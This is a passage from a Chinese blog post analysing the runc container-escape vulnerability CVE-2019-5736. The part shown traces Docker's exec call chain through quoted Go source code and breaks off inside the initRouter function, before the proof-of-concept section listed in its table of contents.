<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noodp" />
    <title class="pjax-title">docker-runc(CVE-2019-5736)漏洞分析 - zyleo&#39;s blog</title><meta name="Description" content=""><meta property="og:title" content="docker-runc(CVE-2019-5736)漏洞分析" />
<meta property="og:description" content="runc: 1.0-rc93 0x00 docker-containerd-shim 调用runc components/cli/cli/command/container/exec.go中执行runExec() 1 2 3 4" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-04-20T23:15:58+00:00" />
<meta property="article:modified_time" content="2021-04-20T23:15:58+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="docker-runc(CVE-2019-5736)漏洞分析"/>
<meta name="twitter:description" content="runc: 1.0-rc93 0x00 docker-containerd-shim 调用runc components/cli/cli/command/container/exec.go中执行runExec() 1 2 3 4"/>
<meta name="application-name" content="zyleo">
<meta name="apple-mobile-web-app-title" content="zyleo">

<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://liuliuliuzy.github.io/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" /><link rel="prev" href="https://liuliuliuzy.github.io/2021-04-05-golang-notes/" /><link rel="next" href="https://liuliuliuzy.github.io/2021-04-27-docker-runc-cve-2019-5736-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E7%AC%AC%E4%BA%8C%E7%89%88/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "docker-runc(CVE-2019-5736)漏洞分析",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/liuliuliuzy.github.io\/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90\/"
        },"genre": "posts","keywords": "Docker, Linux, Golang","wordcount":  9582 ,
        "url": "https:\/\/liuliuliuzy.github.io\/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90\/","datePublished": "2021-04-20T23:15:58+00:00","dateModified": "2021-04-20T23:15:58+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "zyleo"
            },"description": ""
    }
    </script></head>

<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
        function setTheme(theme) {document.body.setAttribute('theme', theme);}
        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('' === 'light' || '' === 'dark' || '' === 'black') setTheme(''), saveTheme(''); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
    </script>
    <div id="back-to-top"></div>
    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
                        <option value="light">浅色</option>
                        <option value="dark">深色</option>
                        <option value="black">黑色</option>
                        <option value="auto">跟随系统</option>
                    </select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="zyleo&#39;s blog">zyleo&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" onclick="return false;" class="menu-item theme-select" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
                    <option value="light">浅色</option>
                    <option value="dark">深色</option>
                    <option value="black">黑色</option>
                    <option value="auto">跟随系统</option>
                </select>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
            <div class="container"><div class="toc" id="toc-auto">
        <h2 class="toc-title">目录</h2>
        <div class="toc-content" id="toc-content-auto"></div>
    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">docker-runc(CVE-2019-5736)漏洞分析</h1><div class="post-meta">
            <div class="post-meta-line">
                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author">zyleo</a>
                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"><i class="far fa-folder fa-fw"></i>源码阅读</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-04-20">2021-04-20</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-04-20">2021-04-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 9582 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 20 分钟&nbsp;<span id="/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/" class="leancloud_visitors" data-flag-title="docker-runc(CVE-2019-5736)漏洞分析">
                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                    </span>&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#0x00-docker-containerd-shim-调用runc">0x00 docker-containerd-shim 调用runc</a></li>
    <li><a href="#0x01-容器之外的runc进程启动">0x01 容器之外的runc进程启动</a></li>
    <li><a href="#0x02-调用链梳理">0x02 调用链梳理</a></li>
    <li><a href="#0x03-runc漏洞poc分析">0x03 runc漏洞poc分析</a></li>
    <li><a href="#0x04-修复代码分析">0x04 修复代码分析</a></li>
    <li><a href="#参考链接">参考链接</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><blockquote>
<p>runc: 1.0-rc93</p>
</blockquote>
<h2 id="0x00-docker-containerd-shim-调用runc">0x00 docker-containerd-shim 调用runc</h2>
<p><code>components/cli/cli/command/container/exec.go</code>中执行<code>runExec()</code></p>
<p><span id="runExec"></span></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">runExec</span><span class="p">(</span><span class="nx">dockerCli</span> <span class="nx">command</span><span class="p">.</span><span class="nx">Cli</span><span class="p">,</span> <span class="nx">options</span> <span class="nx">execOptions</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="o">...</span>

    <span class="nx">response</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">client</span><span class="p">.</span><span class="nf">ContainerExecCreate</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">options</span><span class="p">.</span><span class="nx">container</span><span class="p">,</span> <span class="o">*</span><span class="nx">execConfig</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="nx">execID</span> <span class="o">:=</span> <span class="nx">response</span><span class="p">.</span><span class="nx">ID</span>
    <span class="k">if</span> <span class="nx">execID</span> <span class="o">==</span> <span class="s">&#34;&#34;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;exec ID empty&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Detach</span> <span class="p">{</span>
        <span class="nx">execStartCheck</span> <span class="o">:=</span> <span class="nx">types</span><span class="p">.</span><span class="nx">ExecStartCheck</span><span class="p">{</span>
            <span class="nx">Detach</span><span class="p">:</span> <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Detach</span><span class="p">,</span>
            <span class="nx">Tty</span><span class="p">:</span>    <span class="nx">execConfig</span><span class="p">.</span><span class="nx">Tty</span><span class="p">,</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">client</span><span class="p">.</span><span class="nf">ContainerExecStart</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">execID</span><span class="p">,</span> <span class="nx">execStartCheck</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nf">interactiveExec</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">dockerCli</span><span class="p">,</span> <span class="nx">execConfig</span><span class="p">,</span> <span class="nx">execID</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>runExec()</code>中调用<code>client.ContainerExecCreate()</code>创建执行用户命令的容器，并获取ID。然后再根据命令参数选择是否进行attach操作。</p>
<p>被调用的<code>ContainerExecCreate()</code>定义于<code>components/engine/client/container_exec.go</code>中。该函数向服务端发出了请求。</p>
<p><span id="post"></span></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// ContainerExecCreate creates a new exec configuration to run an exec process.
</span><span class="c1"></span><span class="kd">func</span> <span class="p">(</span><span class="nx">cli</span> <span class="o">*</span><span class="nx">Client</span><span class="p">)</span> <span class="nf">ContainerExecCreate</span><span class="p">(</span><span class="nx">ctx</span> <span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span> <span class="nx">container</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">config</span> <span class="nx">types</span><span class="p">.</span><span class="nx">ExecConfig</span><span class="p">)</span> <span class="p">(</span><span class="nx">types</span><span class="p">.</span><span class="nx">IDResponse</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">response</span> <span class="nx">types</span><span class="p">.</span><span class="nx">IDResponse</span>

    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">NewVersionError</span><span class="p">(</span><span class="s">&#34;1.25&#34;</span><span class="p">,</span> <span class="s">&#34;env&#34;</span><span class="p">);</span> <span class="nb">len</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">Env</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>

    <span class="nx">resp</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">cli</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="s">&#34;/containers/&#34;</span><span class="o">+</span><span class="nx">container</span><span class="o">+</span><span class="s">&#34;/exec&#34;</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">config</span><span class="p">,</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="k">defer</span> <span class="nf">ensureReaderClosed</span><span class="p">(</span><span class="nx">resp</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">err</span> <span class="p">=</span> <span class="nx">json</span><span class="p">.</span><span class="nf">NewDecoder</span><span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">body</span><span class="p">).</span><span class="nf">Decode</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">response</span><span class="p">)</span>
    <span class="k">return</span> <span class="nx">response</span><span class="p">,</span> <span class="nx">err</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>服务端的启动流程应该是这样的:</p>
<ul>
<li>
<p><code>components/engine/cmd/dockerd/docker.go</code>中<code>main()</code>函数被执行</p>
</li>
<li>
<p><code>main()</code>函数调用<code>newDaemonCommand()</code>函数</p>
</li>
<li>
<p><code>newDaemonCommand()</code>函数调用<code>runDaemon()</code>(<code>components/engine/cmd/dockerd/docker_unix.go#11</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">runDaemon</span><span class="p">(</span><span class="nx">opts</span> <span class="o">*</span><span class="nx">daemonOptions</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">daemonCli</span> <span class="o">:=</span> <span class="nf">NewDaemonCli</span><span class="p">()</span>
    <span class="k">return</span> <span class="nx">daemonCli</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="nx">opts</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div></li>
<li>
<p><code>daemonCli.start(opts)</code>调用<code>func (cli *DaemonCli) start()</code>函数(<code>components/engine/cmd/dockerd/daemon.go#77</code>)</p>
</li>
</ul>
<p>服务端的分析从<code>start()</code>函数开始</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">cli</span> <span class="o">*</span><span class="nx">DaemonCli</span><span class="p">)</span> <span class="nf">start</span><span class="p">(</span><span class="nx">opts</span> <span class="o">*</span><span class="nx">daemonOptions</span><span class="p">)</span> <span class="p">(</span><span class="nx">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>
    <span class="c1">//定义api
</span><span class="c1"></span>    <span class="nx">cli</span><span class="p">.</span><span class="nx">api</span> <span class="p">=</span> <span class="nx">apiserver</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="nx">serverConfig</span><span class="p">)</span>

    <span class="o">...</span>
    <span class="c1">//创建Daemon进程
</span><span class="c1"></span>    <span class="nx">d</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">daemon</span><span class="p">.</span><span class="nf">NewDaemon</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">cli</span><span class="p">.</span><span class="nx">Config</span><span class="p">,</span> <span class="nx">pluginStore</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;failed to start daemon&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">d</span><span class="p">.</span><span class="nf">StoreHosts</span><span class="p">(</span><span class="nx">hosts</span><span class="p">)</span>

    <span class="c1">// validate after NewDaemon has restored enabled plugins. Don&#39;t change order.
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">validateAuthzPlugins</span><span class="p">(</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">AuthorizationPlugins</span><span class="p">,</span> <span class="nx">pluginStore</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;failed to validate authorization plugin&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">cli</span><span class="p">.</span><span class="nx">d</span> <span class="p">=</span> <span class="nx">d</span>

    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">startMetricsServer</span><span class="p">(</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Config</span><span class="p">.</span><span class="nx">MetricsAddress</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;failed to start metrics server&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">c</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">createAndStartCluster</span><span class="p">(</span><span class="nx">cli</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">logrus</span><span class="p">.</span><span class="nf">Fatalf</span><span class="p">(</span><span class="s">&#34;Error starting cluster component: %v&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="c1">// Restart all autostart containers which has a swarm endpoint
</span><span class="c1"></span>    <span class="c1">// and is not yet running now that we have successfully
</span><span class="c1"></span>    <span class="c1">// initialized the cluster.
</span><span class="c1"></span>    <span class="nx">d</span><span class="p">.</span><span class="nf">RestartSwarmContainers</span><span class="p">()</span>

    <span class="nx">logrus</span><span class="p">.</span><span class="nf">Info</span><span class="p">(</span><span class="s">&#34;Daemon has completed initialization&#34;</span><span class="p">)</span>

    <span class="c1">//创建路由信息
</span><span class="c1"></span>    <span class="nx">routerOptions</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">newRouterOptions</span><span class="p">(</span><span class="nx">cli</span><span class="p">.</span><span class="nx">Config</span><span class="p">,</span> <span class="nx">d</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="nx">routerOptions</span><span class="p">.</span><span class="nx">api</span> <span class="p">=</span> <span class="nx">cli</span><span class="p">.</span><span class="nx">api</span>
    <span class="nx">routerOptions</span><span class="p">.</span><span class="nx">cluster</span> <span class="p">=</span> <span class="nx">c</span>
    <span class="c1">//初始化路由
</span><span class="c1"></span>    <span class="nf">initRouter</span><span class="p">(</span><span class="nx">routerOptions</span><span class="p">)</span>

    <span class="k">go</span> <span class="nx">d</span><span class="p">.</span><span class="nf">ProcessClusterNotifications</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span> <span class="nx">c</span><span class="p">.</span><span class="nf">GetWatchStream</span><span class="p">())</span>

    <span class="nx">cli</span><span class="p">.</span><span class="nf">setupConfigReloadTrap</span><span class="p">()</span>

    <span class="c1">// The serve API routine never exits unless an error occurs
</span><span class="c1"></span>    <span class="c1">// We need to start it as a goroutine and wait on it so
</span><span class="c1"></span>    <span class="c1">// daemon doesn&#39;t exit
</span><span class="c1"></span>    <span class="nx">serveAPIWait</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">(</span><span class="kd">chan</span> <span class="kt">error</span><span class="p">)</span>
    <span class="k">go</span> <span class="nx">cli</span><span class="p">.</span><span class="nx">api</span><span class="p">.</span><span class="nf">Wait</span><span class="p">(</span><span class="nx">serveAPIWait</span><span class="p">)</span>

    <span class="c1">// after the daemon is done setting up we can notify systemd api
</span><span class="c1"></span>    <span class="nf">notifyReady</span><span class="p">()</span>

    <span class="c1">// Daemon is fully initialized and handling API traffic
</span><span class="c1"></span>    <span class="c1">// Wait for serve API to complete
</span><span class="c1"></span>    <span class="nx">errAPI</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">serveAPIWait</span>
    <span class="nx">c</span><span class="p">.</span><span class="nf">Cleanup</span><span class="p">()</span>
    
    <span class="c1">//关闭Daemon进程
</span><span class="c1"></span>    <span class="c1">// notify systemd that we&#39;re shutting down
</span><span class="c1"></span>    <span class="nf">notifyStopping</span><span class="p">()</span>
    <span class="nf">shutdownDaemon</span><span class="p">(</span><span class="nx">d</span><span class="p">)</span>

    <span class="c1">// Stop notification processing and any background processes
</span><span class="c1"></span>    <span class="nf">cancel</span><span class="p">()</span>

    <span class="k">if</span> <span class="nx">errAPI</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">errors</span><span class="p">.</span><span class="nf">Wrap</span><span class="p">(</span><span class="nx">errAPI</span><span class="p">,</span> <span class="s">&#34;shutting down due to ServeAPI error&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">logrus</span><span class="p">.</span><span class="nf">Info</span><span class="p">(</span><span class="s">&#34;Daemon shutdown complete&#34;</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>再去看<code>initRouter(routerOptions)</code>函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="nf">initRouter</span><span class="p">(</span><span class="nx">opts</span> <span class="nx">routerOptions</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>
    <span class="nx">routers</span> <span class="o">:=</span> <span class="p">[]</span><span class="nx">router</span><span class="p">.</span><span class="nx">Router</span><span class="p">{</span>
        <span class="c1">// we need to add the checkpoint router before the container router or the DELETE gets masked
